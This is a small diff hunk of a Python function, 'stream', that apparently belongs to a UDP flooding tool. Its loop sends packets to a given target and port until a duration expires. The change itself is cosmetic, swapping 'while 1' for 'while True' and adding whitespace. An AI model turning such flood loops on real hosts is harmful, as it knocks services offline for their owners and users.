@@ -34,9 +34,9 @@ def stream(target, port, duration):
     timeout =  time.time() + duration # get the timeout if the host is unreachable after specified duration
     sent = 0
 
-    while 1:
+    while True:
         if time.time() > timeout: # If the timeout is exceeded break the process
-            break
+            break 
         else:
             pass
         client.sendto(bytes, (target, port))
